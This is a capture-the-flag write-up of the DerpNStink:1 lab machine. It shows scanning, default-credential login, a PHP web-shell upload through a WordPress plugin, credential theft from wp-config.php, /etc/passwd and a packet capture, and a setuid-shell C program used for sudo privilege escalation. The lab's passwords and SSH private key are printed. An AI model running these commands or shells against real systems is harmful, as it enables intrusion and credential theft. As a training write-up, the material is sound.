# DerpNStink: 1 Writeup

Let's scan the target
```
$ nmap -p- -A 192.168.79.166

Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 00:24 EST
Nmap scan report for 192.168.79.166
Host is up (0.00068s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|_  256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 00:0C:29:56:DF:59 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms 192.168.79.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds
```

Nothing much here. Let's target port 80 and run *dirb* to search for directories
```sh
$ dirb http://192.168.79.166
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Wed Mar  7 00:33:25 2018
URL_BASE: http://192.168.79.166/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.79.166/ ----
==> DIRECTORY: http://192.168.79.166/css/
+ http://192.168.79.166/index.html (CODE:200|SIZE:1298)
==> DIRECTORY: http://192.168.79.166/javascript/
==> DIRECTORY: http://192.168.79.166/js/
==> DIRECTORY: http://192.168.79.166/php/
+ http://192.168.79.166/robots.txt (CODE:200|SIZE:53)
+ http://192.168.79.166/server-status (CODE:403|SIZE:294) 
==> DIRECTORY: http://192.168.79.166/temporary/
==> DIRECTORY: http://192.168.79.166/weblog/
---- Entering directory: http://192.168.79.166/css/ ----
---- Entering directory: http://192.168.79.166/javascript/ ----
==> DIRECTORY: http://192.168.79.166/javascript/jquery/
---- Entering directory: http://192.168.79.166/js/ ----
---- Entering directory: http://192.168.79.166/php/ ----
+ http://192.168.79.166/php/info.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.79.166/php/phpmyadmin/
```

wordpress is running at */weblog/*
![alt text](images/1.png)

check */wp-admin/*
![alt text](images/2.png)

Try *admin/admin* for login and it works !!
![alt text](images/3.png)

This *admin* user is not wordpress admin. The user has access to *slideshow* which can be edited & file upload allows to upload php file.
![alt text](images/4.png)

Upload simple PHP shell and access it using curl
```sh
$ curl "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?c=ls+-la"                                               
total 128
drwxrwxrwx 3 www-data www-data   4096 Mar  6 15:02 .
drwxr-xr-x 6 www-data www-data   4096 Jan  9 11:52 ..
drwxrwxrwx 2 www-data www-data   4096 Nov 12 22:43 cache
-rw-r--r-- 1 www-data www-data 108987 Nov 12 22:45 derp.png
-rw-r--r-- 1 www-data www-data   1114 Dec 12 16:44 elidumfy.php
-rw-r--r-- 1 www-data www-data     30 Mar  6 15:02 shell.php
$ curl "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?c=ls+-la+/home"                                               
total 16
drwxr-xr-x  4 root   root   4096 Nov 12 12:54 .
drwxr-xr-x 23 root   root   4096 Nov 12 13:39 ..
drwx------ 10 mrderp mrderp 4096 Jan  9 12:15 mrderp
drwx------ 12 stinky stinky 4096 Jan  9 12:14 stinky
$ curl "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?c=cat+/etc/passwd"                                            
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
mysql:x:116:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
```

As this is limited shell, we don't have access to many resurces. From *dirb* output, we know that there is *phpmyadmin* at */php/phpmyadmin/*
![alt text](images/5.png)

Let's get DB creds from *wp-config.php* and use it to login into *phpmyadmin*
```sh
$ curl "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?c=ls+-la+/var/www/html/weblog/"                               
total 196
drwxr-xr-x  5 www-data root     4096 Mar  6 14:51 .
drwxr-xr-x  8 nobody   nogroup  4096 Nov 12 13:15 ..
-rw-r--r--  1 www-data nogroup   418 Sep 24  2013 index.php
-rw-r--r--  1 www-data nogroup 19935 Dec 12 13:39 license.txt
-rw-r--r--  1 www-data nogroup  7322 Dec 12 13:39 readme.html
-rw-r--r--  1 www-data nogroup  5456 May 24  2016 wp-activate.php
drwxr-xr-x  9 www-data nogroup  4096 Aug 16  2016 wp-admin
-rw-r--r--  1 www-data nogroup   364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 www-data nogroup  1477 May 23  2016 wp-comments-post.php
-rw-r--r--  1 www-data nogroup  2853 Dec 16  2015 wp-config-sample.php
-rw-r--r--  1 www-data root     3123 Nov 11 21:35 wp-config.php
drwxr-xr-x  6 www-data nogroup  4096 Nov 12 22:44 wp-content
-rw-r--r--  1 www-data nogroup  3286 May 24  2015 wp-cron.php
drwxr-xr-x 17 www-data nogroup 12288 Aug 16  2016 wp-includes
-rw-r--r--  1 www-data nogroup  2382 May 23  2016 wp-links-opml.php
-rw-r--r--  1 www-data nogroup  3353 Apr 14  2016 wp-load.php
-rw-r--r--  1 www-data nogroup 34057 Jun 14  2016 wp-login.php
-rw-r--r--  1 www-data nogroup  7993 Dec 12 13:39 wp-mail.php
-rw-r--r--  1 www-data nogroup 13920 Aug 13  2016 wp-settings.php
-rw-r--r--  1 www-data nogroup 29890 May 24  2016 wp-signup.php
-rw-r--r--  1 www-data nogroup  4035 Nov 30  2014 wp-trackback.php
-rw-r--r--  1 www-data nogroup  3064 Jul  6  2016 xmlrpc.php
$ curl "http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?c=cat+/var/www/html/weblog/wp-config.php"                     
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

hmm, *root* is being used. Let's login into *phpmyadmin* and check *wordpress_posts*. There is 2nd flag
![flag](images/6.png)

Let's check *mysql.users*
![mysql users](images/7.png)

We have an user *unclestinky* which is simillar to one from */etc/passwd*. Let's try if this hash can be quicky cracked and used. Hash was cracked using [https://crackstation.net/](https://crackstation.net/)
![cracked hash](images/8.png)

Tried this with ssh for *stinky* user, found the login is key based
```
$ ssh stinky@192.168.79.166
The authenticity of host '192.168.79.166 (192.168.79.166)' can't be established.
ECDSA key fingerprint is SHA256:qT1plVN18XwMzkU3qgKKZJAoPJC3+eZDxlrczLy3iCY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.79.166' (ECDSA) to the list of known hosts.
Ubuntu 14.04.5 LTS
                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Permission denied (publickey).
```

Let's try *stinky/wedgie57* for FTP login
```sh
$ ftp 192.168.79.166                                                                                                                           01:33:28
Connected to 192.168.79.166.
220 (vsFTPd 3.0.2)
Name (192.168.79.166:netGh0st): stinky
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45772|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 12 17:23 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12 16:36 ssh
-rwxr-xr-x    1 0        0              17 Nov 12 14:06 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12 17:23 tmp
226 Directory send OK.
```

Most of files are useless, except there is ssh key in *ssh* folder deep inside
```sh
ftp> ls ssh/ssh/ssh/ssh/ssh/ssh/ssh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            1675 Nov 13 05:22 key.txt
226 Directory send OK.
ftp> get key.txt
local: key.txt remote: key.txt
229 Entering Extended Passive Mode (|||45435|).
150 Opening BINARY mode data connection for key.txt (1675 bytes).
100% |***************************************************************|  1675      772.66 KiB/s    00:00 ETA
226 Transfer complete.
1675 bytes received in 00:00 (641.97 KiB/s)
ftp> bye
221 Goodbye.
$ cat key.txt                                                                                                                                  01:45:07
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
```

Now login to server via ssh user *stinky* using above key
```sh
$ ssh -i ~/.ssh/key stinky@192.168.79.166
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

331 packages can be updated.
231 updates are security updates.

Last login: Wed Mar  7 00:15:50 2018 from 192.168.79.128
stinky@DeRPnStiNK:~$ ls
Desktop  Documents  Downloads  ftp
stinky@DeRPnStiNK:~$ ls -la ~/Desktop/
total 12
drwxr-xr-x  2 stinky stinky 4096 Nov 13 01:25 .
drwx------ 12 stinky stinky 4096 Mar  7 00:19 ..
-rwxr-xr-x  1 stinky stinky   72 Nov 12 14:02 flag.txt
stinky@DeRPnStiNK:~$ cat ~/Desktop/flag.txt 
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
$
```

There is flag3:
```
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```

The user *stinky* is not a sudoer. So next step is to get access to *mrderp* user. There is a pcap file in *stinky's* Document directory
```sh
stinky@DeRPnStiNK:~$ cd ~/Documents/
stinky@DeRPnStiNK:~/Documents$ ls
derpissues.pcap
```

There is a file with chatlog between *stinky* & *mrderp* where they talking about packet capture while creating *mrderp* user or wordpress
```sh
$ cat derpissues.txt                                                                                                          
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

Let's check the packet capture
```sh
stinky@DeRPnStiNK:~/Documents$ tcpdump -qns 0 -A -r derpissues.pcap 
reading from file derpissues.pcap, link-type LINUX_SLL (Linux cooked)
00:52:16.911655 IP 127.0.0.1.34017 > 127.0.1.1.53: UDP, length 53
E..Q.g@.@.$3...........5.=.P.............self-repair.mozilla.org.localdomain.....
00:52:16.911742 IP 192.168.1.130.23101 > 192.168.1.1.53: UDP, length 53
E..QF:@.@.p.........Z=.5.=..P9...........self-repair.mozilla.org.localdomain.....
00:52:16.912081 IP 127.0.0.1.34017 > 127.0.1.1.53: UDP, length 53
E..Q.h@.@.$2...........5.=.P.I...........self-repair.mozilla.org.localdomain.....
00:52:16.912169 IP 192.168.1.130.65072 > 192.168.1.1.53: UDP, length 53
E..QF;@.@.p..........0.5.=5.,............self-repair.mozilla.org.localdomain.....
00:52:16.912376 IP 192.168.1.1 > 192.168.1.130: ICMP 192.168.1.1 udp port 53 unreachable, length 36
E..8o...@..............M....E..QF:@.@.p.........Z=.5.=..
00:52:16.912695 IP 192.168.1.1 > 192.168.1.130: ICMP 192.168.1.1 udp port 53 unreachable, length 36
```

Search *POST* to locate POST requests and we find *mrdurp* password
```
POST /weblog/wp-admin/user-new.php HTTP/1.1
Host: derpnstink.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derpnstink.local/weblog/wp-admin/user-new.php
Cookie: wp-saving-post=8-saved; wordpress_ef6a5fe14854bbc5e051bfac8b7603e7=unclestinky%7C1510725219%7CHPwFbs1B7NSefEO05QbhgUwtXobk0hhCbJT33eZsgek%7C6460ba6af109224bf369c32e37c430fd32a9ac320b4d978bc16d8a1f3ca99f9e; wp-settings-time-1=1510552441; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_ef6a5fe14854bbc5e051bfac8b7603e7=unclestinky%7C1510725219%7CHPwFbs1B7NSefEO05QbhgUwtXobk0hhCbJT33eZsgek%7C55f5ff022ece754f6aeb3642679a2074c97bd50b026460691164c8ec509acd34
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 366

action=createuser&_wpnonce_create-user=b250402af6&_wp_http_referer=%2Fweblog%2Fwp-admin%2Fuser-new.php&user_login=mrderp&email=mrderp%40derpnstink.local&first_name=mr&last_name=derp&url=%2Fhome%2Fmrderp&pass1=derpderpderpderpderpderpderp&pass1-text=derpderpderpderpderpderpderp&pass2=derpderpderpderpderpderpderp&pw_weak=on&role=administrator&createuser=Add+New+User
```

The password is *derpderpderpderpderpderpderp*. Let's login with *mrderp*
```sh
stinky@DeRPnStiNK:~/Documents$ su mrderp
Password: 
mrderp@DeRPnStiNK:/home/stinky/Documents$ cd 
mrderp@DeRPnStiNK:~$ ls -la ~/Desktop/
total 12
drwxr-xr-x  2 mrderp mrderp 4096 Nov 13 01:20 .
drwx------ 11 mrderp mrderp 4096 Mar  7 00:16 ..
-rw-r--r--  1 root   root   2129 Nov 13 01:19 helpdesk.log
mrderp@DeRPnStiNK:~$ 
```

There is helpdesk log file which tells about ticket for granting sudoer access to *mrderp*. 
```sh
mrderp@DeRPnStiNK:~$ sudo -l
[sudo] password for mrderp: 
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:~$
```

*derpy* binary at */home/mrderp/binaries/derpy* can be run as sudo for *mrderp*. However there is no binary or path on the server which means if we create the binary which gives shell & run it with sudo, we can get root. Let's create the path required and creat a binary to give shell access
```sh
mrderp@DeRPnStiNK:~$ mkdir binaries
mrderp@DeRPnStiNK:~$ cd binaries/
mrderp@DeRPnStiNK:~/binaries$ cat getroot.c 
#include <unistd.h>	/* setuid, .. */
#include <sys/types.h>	/* setuid, .. */
#include <grp.h>	/* setgroups */
#include <stdio.h>	/* perror */

int main (int argc, char** argv) {

  gid_t newGrp = 0;

  /**
    if you installed programming manual pages, you can get the
    man page for execve 'man execvp'. Same goes for all the
    other system calls that we're using here.
   */

  /* this will tattoo the suid bit so that bash won't see that
     we're not really root. we also drop all other memberships
     just in case we're running with PAGs (in AFS) */
  if (setuid(0) != 0) {
    perror("Setuid failed, no suid-bit set?");
    return 1;
  }
  setgid(0);
  seteuid(0);
  setegid(0);
  /* we also drop all the groups that the old user had
     (verify with id -tool afterwards)
     this is not strictly necessary but we want to get rid of the
     groups that the original user was part of. */
  setgroups(1, &newGrp);
  
  /* load the default shell on top of this program
     to exit from the shell, use 'exit' :-) */
  execvp("/bin/sh", argv); 

  return 0;
}
mrderp@DeRPnStiNK:~$ gcc getroot.c -o derpy
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root/
# ls
Desktop  Documents  Downloads
# cd Desktop
# ls
flag.txt
# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo
# exit
```
#### Game Over

I couldn't find the 1st flag though but this was fun
